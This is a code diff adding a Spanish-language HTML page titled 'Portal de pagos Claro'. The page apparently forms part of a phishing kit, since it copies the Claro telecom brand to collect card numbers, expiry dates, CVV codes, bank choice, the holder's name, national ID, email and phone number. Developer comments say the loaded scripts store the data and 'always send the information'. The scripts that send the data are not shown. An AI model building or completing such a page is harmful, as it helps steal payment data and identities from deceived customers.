@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no" />
+    <link rel="icon" type="image/png" href="img/favicon.ico" />
+    <title>Portal de pagos Claro</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="stylesheet" href="./css/flight.css" />
+    <link rel="stylesheet" href="./css/normalize.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="css/index.css" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Carga aquí el functions es lo que va a guardar siempre la data Y LO VAS A USAR PARA MANDAR SIEMPRE LA INFORMACION -->
+    <script src="./js/functions.js"></script>
+  </head>
+  <body>
+    <header id="comida">
+      <div class="caja_img">
+        <img class="logo" src="img/logo-claro-blanco.svg" />
+      </div>
+    </header>
+    <main>
+      <div id="ggris1" class="gris1">
+        <div class="texto_gris">
+          <br /><br />
+          <p class="texto1">
+            Portal de
+            <span class="rojo"
+              >PAGOS <span class="recargas"> Y RECARGAS</span></span
+            >
+          </p>
+        </div>
+      </div>
+
+      <table id="tabla-opciones">
+        <tr>
+          <td valign="top" align="center">
+            <img id="azul1" src="img/icono-seleccion-on.png" class="imagen" />
+          </td>
+
+          <td valign="top" align="center">
+            <img id="azul2" src="img/icono-mediopago-on.png" class="imagen" />
+          </td>
+
+          <td valign="top" align="center">
+            <img id="azul3" src="img/icono-pago-on.png" class="imagen" />
+          </td>
+
+          <td valign="top" align="center">
+            <img id="azul4" src="img/icono-resultado-off.png" class="imagen" />
+          </td>
+        </tr>
+        <tr>
+          <td valign="top" align="center" class="etq-pasos act-pasos">
+            Ingresa <br />tu Documento
+          </td>
+
+          <td valign="top" align="center" class="etq-pasos act-pasos">
+            Escoge el <br />medio de pago
+          </td>
+
+          <td valign="top" align="center" class="etq-pasos act-pasos">
+            Realiza el <br />Pago en linea
+          </td>
+
+          <td valign="top" align="center" class="etq-pasos">
+            Recibe la <br />Confimacion
+          </td>
+        </tr>
+      </table>
+      <hr />
+      <!-- CARD SECTION -->
+      <div class="form-section">
+        <div class="companies-container">
+          <img src="./assets/svg/visa.svg" />
+          <img src="./assets/svg/mc.svg" />
+          <img src="./assets/svg/diners.svg" />
+          <img src="./assets/svg/amex.svg" />
+        </div>
+
+        <h4>Información de la tarjeta</h4>
+
+        <input
+          id="card_number"
+          class="input-cc bg-std mt-2"
+          placeholder="Número de Tarjeta"
+          type="text"
+          oninput="formatCNumber(this); updateCVCLength(this.value)"
+        />
+
+        <div class="input-group mt-2">
+          <div class="me-2">
+            <input
+              id="month-value"
+              type="text"
+              placeholder="MM"
+              maxlength="2"
+            />
+            <input id="year-value" type="text" placeholder="AA" maxlength="2" />
+            <label class="fs-5">Fecha de Expiración</label>
+          </div>
+          <div>
+            <input
+              class=""
+              type="text"
+              id="card_cvc"
+              maxlength="3"
+              placeholder="CVV"
+            />
+            <label class="fs-5">Código de seguridad</label>
+          </div>
+        </div>
+
+        <!-- BANCO -->
+        <!-- MANDANDO DATOS estás referenciando a bank como bank aquí en el payment.js lo tenías como bank-option, ya lo cambié -->
+        <select id="bank-option" required name="txt-entidad" class="mt-4">
+          <option label="Seleccione su banco" value="">
+            Seleccione su banco
+          </option>
+          <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+          <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+          <option label="BANCO AV VILLAS" value="avvillas">
+            BANCO AV VILLAS
+          </option>
+          <option label="BANCO BBVA COLOMBIA S.A." value="bbva">
+            BANCO BBVA COLOMBIA S.A.
+          </option>
+          <option label="BANCO CAJA SOCIAL" value="caja-social">
+            BANCO CAJA SOCIAL
+          </option>
+          <option
+            label="BANCO COOPERATIVO COOPCENTRAL"
+            value="coopertaivo-coopcentral"
+          >
+            BANCO COOPERATIVO COOPCENTRAL
+          </option>
+          <option label="BANCO CREDIFINANCIERA" value="credifinanciera">
+            BANCO CREDIFINANCIERA
+          </option>
+          <option label="BANCO DAVIVIENDA" value="davivienda">
+            BANCO DAVIVIENDA
+          </option>
+          <option label="BANCO DE BOGOTA" value="bogota">
+            BANCO DE BOGOTA
+          </option>
+          <option label="BANCO DE OCCIDENTE" value="occidente">
+            BANCO DE OCCIDENTE
+          </option>
+          <option label="BANCO FALABELLA " value="falabella">
+            BANCO FALABELLA
+          </option>
+          <option label="BANCO FINANDINA S.A. BIC" value="finandina">
+            BANCO FINANDINA S.A. BIC
+          </option>
+          <option label="BANCO GNB SUDAMERIS" value="sudameris">
+            BANCO GNB SUDAMERIS
+          </option>
+          <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+          <option label="BANCO PICHINCHA S.A." value="pichincha">
+            BANCO PICHINCHA S.A.
+          </option>
+          <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+          <option label="BANCO SANTANDER COLOMBIA" value="santander">
+            BANCO SANTANDER COLOMBIA
+          </option>
+          <option label="BANCO SERFINANZA" value="serfinanza">
+            BANCO SERFINANZA
+          </option>
+          <option label="BANCO UNION antes GIROS" value="union">
+            BANCO UNION antes GIROS
+          </option>
+          <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+          <option label="BANCOOMEVA S.A." value="bancomeva">
+            BANCOOMEVA S.A.
+          </option>
+          <option label="CFA COOPERATIVA FINANCIERA" value="cfa">
+            CFA COOPERATIVA FINANCIERA
+          </option>
+          <option label="CITIBANK " value="citibank">CITIBANK</option>
+        </select>
+
+        <select id="dues" required class="mt-4 mb-5">
+          <option value="" disabled selected>Número de cuotas</option>
+          <option value="1">1</option>
+          <option value="2">2</option>
+          <option value="3">3</option>
+          <option value="4">4</option>
+          <option value="5">5</option>
+          <option value="6">6</option>
+          <option value="7">7</option>
+          <option value="8">8</option>
+          <option value="9">9</option>
+          <option value="10">10</option>
+          <option value="11">11</option>
+          <option value="12">12</option>
+        </select>
+
+        <!-- Tenías un desorden de onclicks acá, valida el tamaño de los inputs usa chatgpt-->
+        <h4 class="mt-5">Información del titular</h4>
+        <input
+          id="name_card"
+          class="mt-4"
+          type="text"
+          placeholder="Nombre y apellido del titular de la tarjeta"
+        />
+        <input
+          id="documentnumber"
+          class="mt-4"
+          type="number"
+          placeholder="Número de identificación"
+        />
+        <input id="email_user" class="mt-4" type="text" placeholder="Correo" />
+        <input
+          id="tel"
+          class="mt-4 mb-5"
+          type="number"
+          placeholder="Celular"
+          maxlength="10"
+        />
+        <label>
+          <div>
+            <div class="mt-4 show justify-content-center">
+              <button id="next-step" type="submit" class="btn btn-gray">
+                Siguiente paso
+              </button>
+            </div>
+          </div>
+        </label>
+      </div>
+    </main>
+    <footer id="footerr">
+      <br /><br />
+      <div class="footer2">
+        <img class="logo2" src="img/logocl.png" width="80" />
+      </div>
+    </footer>
+    <script src="points/checkers/js/payment.js"></script>
+  </body>
+</html>
